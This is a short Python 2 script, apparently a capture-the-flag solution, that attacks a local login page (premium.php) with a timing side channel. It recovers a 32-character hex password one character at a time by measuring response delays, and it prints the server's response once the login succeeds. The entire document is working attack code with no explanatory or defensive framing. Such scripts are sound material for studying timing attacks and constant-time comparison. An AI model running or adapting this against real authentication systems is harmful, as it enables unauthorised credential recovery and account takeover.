#!/usr/bin/env python
import itertools
import time
import requests

from hashlib import md5

URL = 'http://localhost:8089/premium.php'
CHARS = "abcdef0123456789"
GUESS_SIZE = 1

def main():
    solution = ""
    combinations = [x for x in itertools.combinations_with_replacement(CHARS, GUESS_SIZE)]

    for i in range(32/GUESS_SIZE):
        max_val = ""
        max_time = -1
        for c in combinations:
            c = "".join(c)
            t = average_time(pad(solution + c))
            if t > max_time:
                max_time = t
                max_val = c
                print "New max" + max_val
        
        solution = solution + max_val
        print solution 
         

def pad(s):
    return s + '_'*(32 - len(s))

def average_time(hsh, n=4):
    l = [make_request(hsh) for i in range(n)] 
    return min(l)

def make_request(hsh):
    t1 = time.time()
    r = requests.post(URL, data={'username': '~~FLAG~~', 'password': hsh})
    if "Not Authorized" not in r.content:
        print r.status_code
        print r.content
        exit(0)
    t2 = time.time()
     
    final = t2 - t1
    print hsh + ": " + str(final)
    return final

if __name__ == '__main__':
    main()
